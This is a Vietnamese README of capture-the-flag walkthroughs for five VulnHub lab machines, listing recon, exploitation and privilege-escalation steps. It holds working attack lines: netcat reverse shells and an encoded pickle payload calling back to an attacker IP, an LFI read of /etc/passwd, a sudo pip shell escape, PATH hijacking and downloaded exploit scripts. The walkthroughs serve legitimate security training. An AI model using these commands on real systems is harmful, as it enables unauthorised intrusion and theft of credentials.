# Lab
## I. EMPIRE LUPIN ONE

Nguồn hướng dẫn:[Đây](https://www.hackingarticles.in/empire-lupinone-vulnhub-walkthrough/)

1. Tìm kiếm mục tiêu, quét cổng

   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
   
   `nmap -sC -sV 192.168.1.4`
   
   ![image](https://github.com/tninh27/Lab/assets/105789492/f20bdbc8-360a-4bec-9106-99a9aafe3fee)
   
  Ta có:
  - cổng 22 có máy chủ SSH
  - cổng 80 có dịch vụ HTTP (Apache Server), một thư mục /~myfiles

2. Liệt kê

  Dùng trình duyệt xem folder /~myfiles:
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/3ed47e03-fa62-4b7a-86c6-f6f5b4dd5568)
  
  Thử xem bằng chế độ view-source:
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/28c2d911-58d7-49af-85fa-274503a15888)
  
  - Đã có gợi ý đầu tiên

  Dùng kỹ thuật Fuzzing với ffuf tool, xem các thư mục:
  
  `ffuf -c -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -u 'http://192.168.1.4/~FUZZ'`
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/ff4b2830-82c3-491a-9ee2-86627c65f0cf)
  
  - Tìm thấy thư mục bí ẩn secret, mở bằng trình duyệt:

  ![image](https://github.com/tninh27/Lab/assets/105789492/2ae6fe73-c722-41a7-a28f-4f746c62e0ec)
  
  - Gợi ý tên tài khoản đăng nhập là: icex64, khóa sshkey

  Để tìm khóa ssh  đó, tiếp tục sử dụng fuzzing với ffuf tool :
  
  `ffuf -c -ic -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -u 'http://192.168.1.4/~secret/.FUZZ' -fc 403 -e .txt,.html`
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/e03160b8-ab89-40bd-a163-86fe5112a5de)
  
  - Tìm thấy tệp bí mật secret.txt, mở bằng trình duyệt:

  ![image](https://github.com/tninh27/Lab/assets/105789492/7a80106b-63d8-4343-be97-13c76bc3b08f)

  - Tìm được 1 đoạn mã code base58, giải mã nó ta được khóa ssh sau

  ![image](https://github.com/tninh27/Lab/assets/105789492/e4ef6819-5fc8-42e3-a84b-b4b835f78e41)
  
  Tiến hành lưu trữ lại khóa tìm được này vào file *ssh*
  
3. Khai thác

  Dùng ssh2john, băm file *sshkey* vào file *hash* :
  
  `/usr/share/john/ssh2john.py sshkey > hash`
  
   Dùng john, bẻ khóa giá trị băm:
   
  `john --wordlist=/usr/share/wordlists/fasttrack.txt hash`
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/cc291c25-80fb-4c8e-ac2a-a7331c2005da)
  
  - Mật khẩu: P@55w0rd!

  Đăng nhập tài khoản *icex64* bằng khóa *sshkey* và mật khẩu vừa tìm được:
  
  `ssh -i sshkey icex64@192.168.1.4 `
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/4aea8796-5900-4f89-99cc-4a537defdc5a)
  
  Kiểm tra quyền:
  `sudo -l`
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/eaa6b75c-aa5b-4865-bb11-123451aecc52)
  
  - Tìm được người dùng arsense có thể khai thác bằng các chiếm thư viện python

  Xem nội dung file heist.py:
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/f854b90d-b81d-4f45-9a8d-a11ddd1eb19f)
  
4. Leo thang đặc quyền

  Tải Linpeas tool từ Github, cấp quyền thực thi cho nó: [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  
  `wget https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS`
  
  `chmod +x ./linpeas.sh`
  
  Tiến hành chạy linpeas:
	`./linpeas.sh`
 
  ![image](https://github.com/tninh27/Lab/assets/105789492/12216f46-ebf6-4888-8983-66dea24c3530)
  
  - Tìm được đường dẫn thư mục thư viện python

  Dùng nano sửa file trên, thêm lệnh /bin/bash:
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/22d716ac-8a01-49ab-a8a5-c664d9cfdc70)
  
  Chuyển người dùng icex64 sang arsene:
  
  `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py `
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/f8f4b692-7a97-4faf-94ce-df9486abaf45)
  
  Kiểm tra quyền tài khoản arsene:
  `sudo -l `
  
  ![image](https://github.com/tninh27/Lab/assets/105789492/9b0646cf-cc53-4520-874d-88d289923f9f)
  
  - Thấy có quyền thực thi nhị phân pip mà không cần xác minh root, tiến hành leo thang đặc quyền:

  `TF=$(mktemp -d)
  echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
  sudo pip install $TF`

  ![image](https://github.com/tninh27/Lab/assets/105789492/055efa6f-b949-4888-9681-f32caf49769e)

  - Đã đăng nhập tài khoản root, xem file root.txt:

  ![image](https://github.com/tninh27/Lab/assets/105789492/0d60f705-2c87-4cd3-9c38-f556889ec9f0)

## II. Phineas
Nguồn hướng dẫn: [Đây](https://nepcodex.com/2021/06/phineas-walkthrough-vulnhub-writeup/)
1. Tìm kiếm mục tiêu, quét cổng

   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:

   `nmap -T4 -sC -sV -p- 192.168.1.5 `

   ![image](https://github.com/tninh27/Lab/assets/105789492/949296a0-d96c-4436-9455-9484f5a276cf)

   - Ta có: 22 ssh, 80 web http (apache), 3306 mysql

2. Liệt kê

   Dùng dirbuster tool xem các thư mục trên web:

   `gobuster dir -u http://192.168.1.5 -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

   ![image](https://github.com/tninh27/Lab/assets/105789492/ac44e6dd-402a-480a-9f16-09edf9c2f8e3)

   - Tìm được folder structure, tiếp tục liệt kê folder structure:

   `gobuster dir -u http://192.168.1.5/structure -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
   
   ![image](https://github.com/tninh27/Lab/assets/105789492/afc0c780-242e-4269-a7de-d7e0495625e6)

   - Tìm được folder fuel, tiếp tục liệt kê folder fuel:

   `gobuster dir -u http://192.168.1.5/structure/fuel -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

   ![image](https://github.com/tninh27/Lab/assets/105789492/642c7599-a3b0-468f-a4db-2c2e6a83d29d)

   Mở bằng trình duyệt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/05420df6-9621-4b68-bff5-6fcfeb3bb0d3)

   - Thấy trang đăng nhập dịch vụ fuelCMS, tồn tại lỗ hổng có thể thực thi mã từ xa

3. Khai thác

   Sau khi tìm hiểu thông tin lổ hổng và công cụ khai thác từ Google, tiến hành khai thác:

   Tải công cụ khai thác, cấp quyền thực thi và chạy nó:

   `wget https://gist.githubusercontent.com/kriss-u/8e1b44b1f4e393cf0d8a69117227dbd2/raw/4419f8dc7090a41c7ebc96048daf67c43c1996a3/exploit.py`

   `python3 exploit.py`

   ![image](https://github.com/tninh27/Lab/assets/105789492/87e806b5-a1ae-471a-9fba-287c8f97f642)

   Tạo cổng đăng nhập từ xa với netcat:

   `which nc nc 192.168.1.1 4444 -e /bin/bash`

   Lắng nghe cổng vừa tạo: `nc -nlvp 4444`

   ![image](https://github.com/tninh27/Lab/assets/105789492/b9646c1f-4a49-404f-9a93-e1a455eec8a5)

   Tìm kiếm thông tin đăng nhập qua các folder, file:

   `cd /var/www/html/structure/fuel/application/config`
   `cat database.php`

   ![image](https://github.com/tninh27/Lab/assets/105789492/409bdbe3-4eeb-4198-ba61-f553bba1a401)

   - Tìm được tài khoản, mật khẩu:

   Đăng nhập tài khoản anna:

   ![image](https://github.com/tninh27/Lab/assets/105789492/e5a88ff9-4ea0-4ca2-b1b7-3a9f57f89c24)

4. Leo thang đặc quyền

   Sau khi đăng nhập vào tài khoản, tìm kiếm các folder, thư mục chứa lỗ hổng:

   ![image](https://github.com/tninh27/Lab/assets/105789492/298d20a3-382c-4579-a27a-10ae60b480be)

   - Tìm thấy file tồn tại lỗ hổng phương thức POST

   Tải công cụ khai thác, cấp quyền và chạy nó:

   `wget https://gist.githubusercontent.com/kriss-u/085569495cb930e398759c0cbf45e3b7/raw/15fe119ed307ac69673bcaadd9fab84c32a85a00/pickle-payload-py3.py`

   `python3 pickle-payload-py3.py "nc 192.168.1.1 8888 -e /bin/bash"`

   ![image](https://github.com/tninh27/Lab/assets/105789492/60ea6c7a-fb88-47ee-85a9-4b1d105c4462)

   - Quá trình này tạo ra 1 đoạn mã cho phép máy có IP: 192.168.1.1 (attacker) có thể đăng nhập với quyền root

   Dùng phương thức POST đẩy đoạn mã này lên:

   `curl -d “awesome=gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBuYyAxOTIuMTY4LjEuMSA4ODg4IC1lIC9iaW4vYmFzaJSFlFKULg==” -X POST http://127.0.0.1:5000/heaven`

   Lắng nghe cổng vừa tạo:

   ![image](https://github.com/tninh27/Lab/assets/105789492/85d82d7a-1f14-4ef4-98e7-ded472635f96)

   Chạy đoạn mã đăng nhập root:

   `export TERM=xterm python3 -c 'import pty;pty.spawn("/bin/bash")' `

   Xem file root.txt:
   
   ![image](https://github.com/tninh27/Lab/assets/105789492/c8c3ea34-b042-48bd-a6de-6ec2bef6f229)

## III. Darkhole2

Nguồn hướng dẫn: [Đây](https://www.hackingarticles.in/darkhole-2-vulnhub-walkthrough/)

1. Tìm kiếm mục tiêu, quét cổng

   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:

   `nmap -A 192.168.1.6`

   - Ta có: 22 ssh, 80 web ( chú ý thư mục .git)

2. Liệt kê

   Xem web bằng trình duyệt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/a00f5f7d-2f8c-4f03-8f3e-d9d3e7077f59)

   ![image](https://github.com/tninh27/Lab/assets/105789492/b9a003e4-b3cc-4ea7-be25-c31d2411473a)

   Xem thư mục .git:

   ![image](https://github.com/tninh27/Lab/assets/105789492/be99293a-947d-4215-9900-fa4b14065fc0)

   Chạy công cụ git-dumper:

   `python3 git_dumper.py http://192.168.1.6/.git/ backup`

   ![image](https://github.com/tninh27/Lab/assets/105789492/6b234414-b84e-43ad-9c83-c390bc01b782)

   Kiểm tra dữ liệu vừa dump được: `git log`

   ![image](https://github.com/tninh27/Lab/assets/105789492/f4a7f5fd-7b3b-4e03-a7f9-9a93e5e21adb)

   Giải mã giá trị:

   `git diff a4d900a8d85e8938d3601f3cef113ee293028e10`

   ![image](https://github.com/tninh27/Lab/assets/105789492/de84412f-f32b-4206-bca3-b4e7a9df6b06)

   - Tìm được tài khoản đăng nhập web

3. Khai thác
   
   Đăng nhập tài khoản vừa tìm được:
   
   ![image](https://github.com/tninh27/Lab/assets/105789492/2108bffd-2342-49c3-9c24-55e0f6dd2e67)

   Dùng burp suite chặn bắt và lưu cookie trình duyệt vào file *sql*:

   ![image](https://github.com/tninh27/Lab/assets/105789492/7fb56242-1569-4f14-974f-3412dda23049)

   Dùng công cụ sqlmap, khai thác lỗ hổng sql injection:

   `sqlmap -r sql --dbs --batch`

   ![image](https://github.com/tninh27/Lab/assets/105789492/6e37cd68-e8f1-4e9d-b655-5d215bf40038)

   - Tìm được database: darkhole_2, dump dữ liệu trên db này:

   `sqlmap -r sql -D darkhole_2 --dump-all --batch`

   ![image](https://github.com/tninh27/Lab/assets/105789492/6a9a8f3e-ed81-4599-84c1-5dcb36152bfd)

   - Tìm được tài khoản đăng nhập ssh, đăng nhập:

   `ssh jehad@192.168.1.6`

   ![image](https://github.com/tninh27/Lab/assets/105789492/b2813558-6399-45c2-ac6e-94026522f7e8)

4. Leo thang đặc quyền

   Tải công cụ linpeas, cấp quyền và chạy nó:

   ![image](https://github.com/tninh27/Lab/assets/105789492/d9e587de-c615-4d05-8a59-014e91162f67)

   Tìm thấy tài khoản *losy* có thư mục /opt/web, xem nó:

   `cd /opt/web cat index.php`

   ![image](https://github.com/tninh27/Lab/assets/105789492/c79acf12-6c8c-4a74-a5d0-cfd590ab39a1)

   - Người dùng này tồn tại lỗ hổng có thể chạy lệnh cmd
  
   Tiến hành đăng nhập với cổng 9999 vừa tìm được:

   ![image](https://github.com/tninh27/Lab/assets/105789492/37d0afd0-87ee-459d-b90f-018928f5d49c)

   Tại đây có thể chạy các lênh CMD thông qua trình duyệt web:

   `curl 127.0.0.1:9999/?cmd=id`

   ![image](https://github.com/tninh27/Lab/assets/105789492/e866e94c-3e09-427e-b7d7-475fa4948961)

   Copy thư mục /bin/bash từ jehad sang losy:

   `curl 127.0.0.1:9999/?cmd=cp%20%2Fbin%2Fbash%20%2Ftmp%2Fuserbash`

   ![image](https://github.com/tninh27/Lab/assets/105789492/df558080-df70-418e-a580-24ab6fbf9cb4)

   Cung cấp quyền shell cho file vừa copy:

   `curl 127.0.0.1:9999/?cmd=chmod%20%2Bs%20%2Ftmp%2Fuserbash`

   ![image](https://github.com/tninh27/Lab/assets/105789492/cc97bf85-bb12-4cb5-91b8-a219b04dbb85)

   Chạy lệnh khai thác: `./userbash -p`

   ![image](https://github.com/tninh27/Lab/assets/105789492/1c504b57-3675-49a3-8709-cfb45ffe28ed)

   Đã có shell của losy, xem file bash_history:

   ![image](https://github.com/tninh27/Lab/assets/105789492/3c9c47b8-2639-4604-9bc4-0edb7a4bcd61)

   - Đã tìm được mật khẩu losy, đăng nhập, kiểm tra quyền:

   ![image](https://github.com/tninh27/Lab/assets/105789492/11886207-353d-4d2e-95c0-c23962ef2d12)

   ![image](https://github.com/tninh27/Lab/assets/105789492/08363d90-fabf-4014-b86e-060f2cdcc2c9)

   - Tồn lại lỗ hổng khai thác bằng cách chiếm quyền điều khiển thư viện python

   Chạy lệnh khai thác, xem file root.txt

   `sudo python3 -c 'import pty; pty.spawn("/bin/bash")'`

   ![image](https://github.com/tninh27/Lab/assets/105789492/c041f2c3-f31c-4694-b7d4-44bac5836f1a)

## IV. Darkhole1

Nguồn hướng dẫn:[Đây](https://resources.infosecinstitute.com/topic/darkhole-1-vulnhub-ctf-walkthrough/)

1. Tìm kiếm mục tiêu, quét cổng

   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
   
   `nmap -sV -p- 192.168.1.7`

   ![image](https://github.com/tninh27/Lab/assets/105789492/4ec60209-f825-496f-b694-0b6ab7f1cadc)

   - Ta có: 22 ssh, 80 web

2. Liệt kê

   Dùng công cụ dirbuster xem các thư mục,sau đó xem bằng trình duyệt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/655e4482-7bcf-4229-9415-c4deb776f9b2)

   Đăng ký tài khoản, và đăng nhập:

   ![image](https://github.com/tninh27/Lab/assets/105789492/0f894096-e307-490d-9f4b-b414dd1cd67f)

3. Khai thác

   Dùng burp suite chặn bắt và thử thay đổi mật khẩu với id=1 (id admin)

   ![image](https://github.com/tninh27/Lab/assets/105789492/95d42239-7a46-476a-9122-6267960ca07c)

   Đổi thành công mật khẩu tài khoản admin, tiến hành đăng nhập tài khoản admin:

   ![image](https://github.com/tninh27/Lab/assets/105789492/746372bc-c851-4a90-8b02-390f767223e6)

   - Tại đây thấy tính năng upload file ảnh
   
   Tạo 1 file php_shell với đuôi tệp .phtml nhằm đánh lừa và upload lên web:

   ![image](https://github.com/tninh27/Lab/assets/105789492/efd04f61-2132-4948-9c3f-32440418fdd9)

   Nghe cổng vừa tạo trong file shell:

   ![image](https://github.com/tninh27/Lab/assets/105789492/9a095511-85c0-488f-928c-71312d5d9838)

   Sau khi có shell, chạy lệnh:

   `python3 -c ‘import pty;pty.spawn(“/bin/bash”)’`

   ![image](https://github.com/tninh27/Lab/assets/105789492/f63f9444-e603-4a63-a935-27fc346ca4d1)

   Xem các tệp người dùng John thấy có file toto có thể chạy với quyền root:

   `cd /tmp`
   `echo “/bin/bash” > id`
   `chmod +x id`
   `export PATH=/tmp:$PATH`
   `which id`

   Chạy file toto:

   ![image](https://github.com/tninh27/Lab/assets/105789492/59744b3c-1642-461e-baf9-eb079ab72928)

   Đăng nhập thành công John, xem file password:

   ![image](https://github.com/tninh27/Lab/assets/105789492/d148e7ff-c41a-42a3-8a2d-440bd54b0872)

4. Leo thang đặc quyền

   Đăng nhập với password vừa tìm được : `sudo –l`

   ![image](https://github.com/tninh27/Lab/assets/105789492/810ca1ae-452b-48c2-a75a-01fda9729b09)

   Chạy lệnh khai thác:

   `echo ‘import os;os.system(“/bin/bash”)’ > file.py`
   `sudo /usr/bin/python3 /home/john/file.py`
   `id`

   ![image](https://github.com/tninh27/Lab/assets/105789492/1c4475bd-8bd0-468e-b8de-475896816214)

   Đã đăng nhập root, xem file root.txt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/257bb341-e5fd-4c93-995b-783ffadd84fb)

## V. Prime1

Nguồn hướng dẫn:[Đây](https://www.hackingarticles.in/prime-1-vulnhub-walkthrough/)

1. Tìm kiếm mục tiêu, quét cổng

   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
   
   `nmap -A 192.168.1.8`

   - Ta có: 22 ssh, 80 web

2. Liệt kê

   Dùng công cụ dirb xem các thư mục:

   `dirb http://192.168.1.8`

   ![image](https://github.com/tninh27/Lab/assets/105789492/28123b0e-d720-4ace-9b0b-cb733c14638e)

   Xem bằng trình duyệt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/fc663aee-98eb-4c6f-9616-55d17593c40d)

   Tiếp tục dùng dirb thêm đuôi .txt:

   `dirb http://192.168.1.8/ -X .txt`

   ![image](https://github.com/tninh27/Lab/assets/105789492/2c7d838b-c213-4eb7-b9e6-111e887c7d18)

   Xem file secret.txt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/7d0d8eeb-b67d-4b0c-ba7f-34765a2d1123)

   Tiếp tục xem trên web:
   `http://192.168.1.8/index.php?file=`

   ![image](https://github.com/tninh27/Lab/assets/105789492/8e4fa9bc-397d-412e-a4ff-4d1ec8e098b1)

   `http://192.168.1.8/index.php?file=location.txt`

   ![image](https://github.com/tninh27/Lab/assets/105789492/97ce95f9-3be6-4d54-8b9f-b8a0dd391e35)

   - Thấy gợi ý sử dụng secrettier360

3. Khai thác

   Dùng gợi ý secrettier360, xem trên web:

   `http://192.168.1.8/image.php?secrettier360=/etc/passwd`

   ![image](https://github.com/tninh27/Lab/assets/105789492/7d6b232e-8e9d-4cab-91de-bc7ace848e54)

   - Thấy gợi ý về tài khoản saket

   `http://192.168.1.8/image.php?secrettier360=/home/saket/password.txt`

   - Có được mật khẩu đăng nhập
   
   Tiến hành đăng nhập wordpress:

   ![image](https://github.com/tninh27/Lab/assets/105789492/0a2f9e43-8cf5-446d-b758-f9a6d573db51)

   Tìm kiếm thấy tệp secret.php(trong phần theme editor) có quyền ghi, viết lệnh vào đây:

   ![image](https://github.com/tninh27/Lab/assets/105789492/20f2292b-4d75-41b8-9838-b526bb915d71)

   Copy đoạn code reverse shell vào đây, nhấn update:

   ![image](https://github.com/tninh27/Lab/assets/105789492/a7a286c6-05c2-47e7-9fa9-ca3afaba30a9)

   Nghe cổng vừa tạo và kích hoạt file trên:

   ![image](https://github.com/tninh27/Lab/assets/105789492/eed967ed-131f-436e-bf17-07ee9c257d64)

   Đã có shell, chạy lệnh khai thác:
   
   `python -c ‘import pty;pty.spawn(“/bin/bash”)’`

   ![image](https://github.com/tninh27/Lab/assets/105789492/8f569eab-adc1-4e2a-9eeb-3b8f6c2320cb)

4. Leo thang đặc quyền

   Xem phiên bản hệ điều hành: `uname -a`

   ![image](https://github.com/tninh27/Lab/assets/105789492/f40b5b46-bd6f-4c87-b76a-e1e09d57d9ea)

   - Thấy phiên bản này tồn tại lỗ hổng có thể khai thác

   Tải công cụ khai thác, cấp quyền và chạy nó:

   `git clone https://github.com/kkamagui/linux-kernel-exploits`

   `./compile.sh`
   
   `./CVE-2017-16995`

   ![image](https://github.com/tninh27/Lab/assets/105789492/8832c440-7df4-421a-add4-ea2e3b5e3fbf)

   ![image](https://github.com/tninh27/Lab/assets/105789492/560d1ef0-fc43-4026-a381-07a3b4d1d299)

   Sau khi chạy thành công đã có root, xem file root.txt:

   ![image](https://github.com/tninh27/Lab/assets/105789492/3466e67f-afae-4fa4-9b22-9465d79a1db0)

